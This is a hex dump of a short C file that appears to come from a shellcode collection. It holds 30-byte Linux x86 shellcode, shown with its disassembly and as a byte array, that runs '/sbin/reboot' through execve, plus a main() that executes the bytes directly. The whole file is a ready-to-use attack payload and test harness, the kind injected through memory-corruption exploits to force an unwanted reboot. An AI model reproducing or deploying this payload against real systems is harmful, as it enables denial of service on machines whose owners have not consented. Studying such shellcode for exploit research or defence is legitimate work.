00000000  2f 2a 20 20 4c 69 6e 75  78 20 78 38 36 20 50 55  |/*  Linux x86 PU|
00000010  53 48 20 72 65 62 6f 6f  74 28 29 20 2d 20 33 30  |SH reboot() - 30|
00000020  20 62 79 74 65 73 0d 0a  20 2a 20 20 4a 6f 6e 61  | bytes.. *  Jona|
00000030  74 68 61 6e 20 53 61 6c  77 61 6e 20 6a 73 2e 72  |than Salwan js.r|
00000040  61 63 2e 70 72 6f 6a 65  74 5b 2a 41 54 5d 67 6d  |ac.projet[*AT]gm|
00000050  61 69 6c 2e 63 6f 6d 0d  0a 20 2a 20 20 57 65 62  |ail.com.. *  Web|
00000060  3a 20 68 74 74 70 3a 2f  2f 77 77 77 2e 73 68 65  |: http://www.she|
00000070  6c 6c 2d 73 74 6f 72 6d  2e 6f 72 67 0d 0a 20 2a  |ll-storm.org.. *|
00000080  0d 0a 20 2a 20 44 69 73  61 73 73 65 6d 62 6c 79  |.. * Disassembly|
00000090  20 6f 66 20 73 65 63 74  69 6f 6e 20 2e 74 65 78  | of section .tex|
000000a0  74 3a 0d 0a 20 2a 0d 0a  20 2a 20 30 38 30 34 38  |t:.. *.. * 08048|
000000b0  30 35 34 20 3c 2e 74 65  78 74 3e 3a 0d 0a 20 2a  |054 <.text>:.. *|
000000c0  20 38 30 34 38 30 35 34  3a 20 20 20 20 20 20 20  | 8048054:       |
000000d0  33 31 20 63 30 20 20 20  20 20 20 20 20 20 20 20  |31 c0           |
000000e0  20 20 20 20 20 20 20 20  78 6f 72 20 20 20 20 25  |        xor    %|
000000f0  65 61 78 2c 25 65 61 78  0d 0a 20 2a 20 38 30 34  |eax,%eax.. * 804|
00000100  38 30 35 36 3a 20 20 20  20 20 20 20 35 30 20 20  |8056:       50  |
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000120  20 20 20 20 70 75 73 68  20 20 20 25 65 61 78 0d  |    push   %eax.|
00000130  0a 20 2a 20 38 30 34 38  30 35 37 3a 20 20 20 20  |. * 8048057:    |
00000140  20 20 20 36 38 20 36 32  20 36 66 20 36 66 20 37  |   68 62 6f 6f 7|
00000150  34 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |4          push |
00000160  20 20 24 30 78 37 34 36  66 36 66 36 32 0d 0a 20  |  $0x746f6f62.. |
00000170  2a 20 38 30 34 38 30 35  63 3a 20 20 20 20 20 20  |* 804805c:      |
00000180  20 36 38 20 36 65 20 32  66 20 37 32 20 36 35 20  | 68 6e 2f 72 65 |
00000190  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000001a0  24 30 78 36 35 37 32 32  66 36 65 0d 0a 20 2a 20  |$0x65722f6e.. * |
000001b0  38 30 34 38 30 36 31 3a  20 20 20 20 20 20 20 36  |8048061:       6|
000001c0  38 20 32 66 20 37 33 20  36 32 20 36 39 20 20 20  |8 2f 73 62 69   |
000001d0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 24 30  |       push   $0|
000001e0  78 36 39 36 32 37 33 32  66 0d 0a 20 2a 20 38 30  |x6962732f.. * 80|
000001f0  34 38 30 36 36 3a 20 20  20 20 20 20 20 38 39 20  |48066:       89 |
00000200  65 33 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |e3              |
00000210  20 20 20 20 20 6d 6f 76  20 20 20 20 25 65 73 70  |     mov    %esp|
00000220  2c 25 65 62 78 0d 0a 20  2a 20 38 30 34 38 30 36  |,%ebx.. * 804806|
00000230  38 3a 20 20 20 20 20 20  20 35 30 20 20 20 20 20  |8:       50     |
00000240  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000250  20 70 75 73 68 20 20 20  25 65 61 78 0d 0a 20 2a  | push   %eax.. *|
00000260  20 38 30 34 38 30 36 39  3a 20 20 20 20 20 20 20  | 8048069:       |
00000270  38 39 20 65 32 20 20 20  20 20 20 20 20 20 20 20  |89 e2           |
00000280  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
00000290  65 73 70 2c 25 65 64 78  0d 0a 20 2a 20 38 30 34  |esp,%edx.. * 804|
000002a0  38 30 36 62 3a 20 20 20  20 20 20 20 35 33 20 20  |806b:       53  |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  20 20 20 20 70 75 73 68  20 20 20 25 65 62 78 0d  |    push   %ebx.|
000002d0  0a 20 2a 20 38 30 34 38  30 36 63 3a 20 20 20 20  |. * 804806c:    |
000002e0  20 20 20 38 39 20 65 31  20 20 20 20 20 20 20 20  |   89 e1        |
000002f0  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
00000300  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 20 2a 20  |  %esp,%ecx.. * |
00000310  38 30 34 38 30 36 65 3a  20 20 20 20 20 20 20 62  |804806e:       b|
00000320  30 20 30 62 20 20 20 20  20 20 20 20 20 20 20 20  |0 0b            |
00000330  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 24 30  |       mov    $0|
00000340  78 62 2c 25 61 6c 0d 0a  20 2a 20 38 30 34 38 30  |xb,%al.. * 80480|
00000350  37 30 3a 20 20 20 20 20  20 20 63 64 20 38 30 20  |70:       cd 80 |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000370  20 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |  int    $0x80..|
00000380  20 2a 0d 0a 20 2a 2f 0d  0a 0d 0a 6d 61 69 6e 28  | *.. */....main(|
00000390  29 0d 0a 7b 0d 0a 63 68  61 72 20 73 68 65 6c 6c  |)..{..char shell|
000003a0  63 6f 64 65 5b 5d 20 3d  20 0d 0a 09 09 09 22 5c  |code[] = ....."\|
000003b0  78 33 31 5c 78 63 30 22  0d 0a 09 09 09 22 5c 78  |x31\xc0"....."\x|
000003c0  35 30 22 0d 0a 09 09 09  22 5c 78 36 38 5c 78 36  |50"....."\x68\x6|
000003d0  32 5c 78 36 66 5c 78 36  66 5c 78 37 34 22 0d 0a  |2\x6f\x6f\x74"..|
000003e0  09 09 09 22 5c 78 36 38  5c 78 36 65 5c 78 32 66  |..."\x68\x6e\x2f|
000003f0  5c 78 37 32 5c 78 36 35  22 0d 0a 09 09 09 22 5c  |\x72\x65"....."\|
00000400  78 36 38 5c 78 32 66 5c  78 37 33 5c 78 36 32 5c  |x68\x2f\x73\x62\|
00000410  78 36 39 22 0d 0a 09 09  09 22 5c 78 38 39 5c 78  |x69"....."\x89\x|
00000420  65 33 22 0d 0a 09 09 09  22 5c 78 35 30 22 0d 0a  |e3"....."\x50"..|
00000430  09 09 09 22 5c 78 38 39  5c 78 65 32 22 0d 0a 09  |..."\x89\xe2"...|
00000440  09 09 22 5c 78 35 33 22  0d 0a 09 09 09 22 5c 78  |.."\x53"....."\x|
00000450  38 39 5c 78 65 31 22 0d  0a 09 09 09 22 5c 78 62  |89\xe1"....."\xb|
00000460  30 5c 78 30 62 22 0d 0a  09 09 09 22 5c 78 63 64  |0\x0b"....."\xcd|
00000470  5c 78 38 30 22 3b 0d 0a  0d 0a 20 20 20 20 20 20  |\x80";....      |
00000480  20 09 70 72 69 6e 74 66  28 22 4c 65 6e 67 74 68  | .printf("Length|
00000490  3a 20 25 64 5c 6e 22 2c  73 74 72 6c 65 6e 28 73  |: %d\n",strlen(s|
000004a0  68 65 6c 6c 63 6f 64 65  29 29 3b 0d 0a 09 28 2a  |hellcode));...(*|
000004b0  28 76 6f 69 64 28 2a 29  28 29 29 20 73 68 65 6c  |(void(*)()) shel|
000004c0  6c 63 6f 64 65 29 28 29  3b 20 20 20 20 20 20 20  |lcode)();       |
000004d0  0d 0a 7d                                          |..}|
000004d3
